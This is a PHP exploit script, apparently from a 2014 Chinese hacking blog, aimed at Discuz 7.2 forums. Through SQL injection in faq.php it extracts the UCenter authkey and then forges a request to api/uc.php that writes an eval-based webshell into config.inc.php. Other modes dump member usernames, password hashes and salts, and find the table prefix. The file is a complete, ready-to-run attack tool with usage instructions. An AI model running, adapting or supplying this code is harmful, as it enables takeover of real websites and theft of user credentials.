<?php

/**
 * @author: xiaoma
 * @blog  : www.i0day.com
 * @date  : 2014.7.2 23:1
 */

error_reporting(0);
set_time_limit(3000);
$host=$argv[1];
$path=$argv[2];
$js=$argv[3];
$timestamp = time()+10*3600;
$table="cdb_";//table

if ($argc < 2) {
    print_r('
  ********************************************************
  *  Discuz faq.php SQL Injection Exp                    *
  *  ---------By£ºWww.i0day.com-----------               * 
  *     Usage: php '.$argv[0].' url [js]                    *
  *  -------------------------------------               *
  *  jsoption: 1.GetShell 2.get pwd 3.get the table prefix  *
  *                                                      *
  *   php '.$argv[0].' Www.i0day.com / 1                    *
  *   php '.$argv[0].' Www.i0day.com /dz72/ 1               *
  *                                                      * 
  *                                                      *
  ********************************************************
     ');
     exit;
}
if($js==1){
    $sql="action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x3a3a,(select%20length(authkey)%20from%20".$table."uc_applications%20limit%200,1),0x3a3a)x%20from%20information_schema.tables%20group%20by%20x)a)%23";
    $resp = sendpack($host,$path,$sql);
    
    if(strpos($resp,"::")==-1){
        echo 'the default table should not cdb_ please check the table!\n';
    }else{
    preg_match("/::(.*)::/",$resp,$matches);
	echo "the matches is $matches[1]" ;
    $lenght=intval($matches[1]);
    if($lenght){
        if($lenght<=124){
            $sql="action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x5E,(select%20substr(authkey,1,62)%20from%20".$table."uc_applications%20limit%200,1))x%20from%20information_schema.tables%20group%20by%20x)a)%23";
            $resp = sendpack($host,$path,$sql);
            if(strpos($resp,"1\^")!=-1){
                preg_match("/1\^(.*)\'/U",$resp,$key1);
            $sql="action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x5E,(select%20substr(authkey,63,62)%20from%20".$table."uc_applications%20limit%200,1))x%20from%20information_schema.tables%20group%20by%20x)a)%23";
            $resp = sendpack($host,$path,$sql);
            preg_match("/1\^(.*)\'/U",$resp,$key2);
            $key=$key1[1].$key2[1];
            $code=urlencode(_authcode("time=$timestamp&action=updateapps", 'ENCODE', $key));
            $cmd1='<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
 <item id="UC_API">http://192.168.2.38/discuz_7.2/uc_server\');eval($_POST[i0day]);//</item>
</root>';
            $cmd2='<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
 <item id="UC_API">http://192.168.2.38/discuz_7.2/uc_server</item>
</root>';
            $html1 = send($cmd1);
            $res1=substr($html1,-1);
            $html2 = send($cmd2);
            $res2=substr($html1,-1);
            if($res1=='1'&&$res2=='1'){
            echo "shell url:http://".$host.$path.'config.inc.php   pass:i0day'."\n";
            }
            }else{
                echo 'get fail';
            }
        }
    }
   }        

}elseif($js==2){
    $sql="action=grouppermission&gids[99]=%27&gids[100][0]=%29%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%20concat%280x5E5E5E,username,0x3a,password,0x3a,salt%29%20from%20".$table."uc_members%20limit%200,1%29,floor%28rand%280%29*2%29,0x5E%29x%20from%20information_schema.tables%20group%20by%20x%29a%29%23";
    $resp = sendpack($host,$path,$sql);
    if(strpos($resp,"\^\^\^")!=-1){
        preg_match("/\^\^\^(.*)\^/U",$resp,$password);
        echo 'passwd:'.$password[1]."\n";
        }else{
            echo 'the default table prefix should not cdb_ please check the table prefix!\n';
        }
}elseif($js==3){
    $sql="action=grouppermission&gids[99]='&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat(floor(rand(0)*2),0x5E,(select%20hex(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1),0x5E)x%20from%20information_schema%20.tables%20group%20by%20x)a)%23";
    $resp = sendpack($host,$path,$sql);
    if(strpos($resp,"1\^")!=-1){
        preg_match("/1\^(.*)\^/U",$resp,$t);
        
        if(strpos($t[1],"cdb_")!=-1){
            echo "table:".hex2str($t[1])." the table is default cdb_ don't change table\n";
        }else{
            echo "table:".hex2str($t[1]).' not the default table cdb_please change the code $table\n';
        }
    }else{
        echo "check the table prefix fail,Sorry\n";
    }
}else{
    echo "don't choose any function\n";
}


function sendpack($host,$path,$sql,$js){
       $data = "GET ".$path."/faq.php?".$sql." HTTP/1.1\r\n"; 
        $data.="Host:".$host."\r\n";
        $data.="User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:20.0) Gecko/20100101 Firefox/20.0\r\n";
        $data.="Connection: close\r\n\r\n";
        //$data.=$html."\r\n";
        $ock=fsockopen($host,80);

        if(!$ock){
        echo "No response from ".$host;
        die();
        
        }
        fwrite($ock,$data);

        $resp = '';

        while (!feof($ock)) {

                $resp.=fread($ock, 1024);
                }

        return $resp;

}
function send($cmd){
    global $host,$code,$path;
    $message = "POST ".$path."/api/uc.php?code=".$code."  HTTP/1.1\r\n";
    $message .= "Accept: */*\r\n";
    $message .= "Referer: ".$host."\r\n";
    $message .= "Accept-Language: zh-cn\r\n";
    $message .= "Content-Type: application/x-www-form-urlencoded\r\n";
    $message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
    $message .= "Host: ".$host."\r\n";
    $message .= "Content-Length: ".strlen($cmd)."\r\n";
    $message .= "Connection: Close\r\n\r\n";
    $message .= $cmd;
 
	//var_dump($message);
    $fp = fsockopen($host, 80);
    fputs($fp, $message);
 
    $resp = '';
 
    while ($fp && !feof($fp))
        $resp .= fread($fp, 1024);
 
    return $resp;
}
 
function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {
    $ckey_length = 4;
 
    $key = md5($key ? $key : UC_KEY);
    $keya = md5(substr($key, 0, 16));
    $keyb = md5(substr($key, 16, 16));
    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
 
    $cryptkey = $keya.md5($keya.$keyc);
    $key_length = strlen($cryptkey);
 
    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
    $string_length = strlen($string);
 
    $result = '';
    $box = range(0, 255);
 
    $rndkey = array();
    for($i = 0; $i <= 255; $i++) {
        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
    }
 
    for($j = $i = 0; $i < 256; $i++) {
        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }
 
    for($a = $j = $i = 0; $i < $string_length; $i++) {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
    }
 
    if($operation == 'DECODE') {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
            return substr($result, 26);
        } else {
                return '';
            }
    } else {
        return $keyc.str_replace('=', '', base64_encode($result));
    }
 
}
function hex2str($hex){
    $str = '';
    $arr = str_split($hex, 2);
    foreach($arr as $bit){
        $str .= chr(hexdec($bit));
    }
    return $str;
    }
?>